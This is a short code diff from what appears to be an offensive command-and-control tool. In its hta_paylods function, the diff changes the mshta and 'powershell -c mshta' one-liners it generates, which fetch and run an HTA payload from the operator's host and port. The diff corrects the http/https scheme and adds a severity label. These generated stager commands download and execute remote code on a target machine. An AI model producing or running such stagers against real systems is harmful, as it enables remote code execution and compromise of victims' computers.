@@ -5,16 +5,16 @@ from core.color import bcolors
 
 def hta_paylods():
     if SSL==True:
-
-        print 'mshta {HTTP}://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload)
+        print bcolors.OKBLUE + '(LOW):' + bcolors.ENDC
+        print 'mshta https://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload)
         print 'powershell -c \"mshta https://%s:%s%s\"' % (config.HOST, config.PORT,config.hta_payload)
         config.PAYLOADS.append('\nmshta https://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload))
         print ''
     else:
         print bcolors.OKBLUE + '(LOW):' + bcolors.ENDC
-        print 'mshta {HTTP}://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload)
-        print 'powershell -c \"mshta https://%s:%s%s\"' % (config.HOST, config.PORT,config.hta_payload)
-        config.PAYLOADS.append('\nmshta https://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload))
+        print 'mshta http://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload)
+        print 'powershell -c \"mshta http://%s:%s%s\"' % (config.HOST, config.PORT,config.hta_payload)
+        config.PAYLOADS.append('\nmshta http://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload))
         print ''
 
 def pwsh_job():
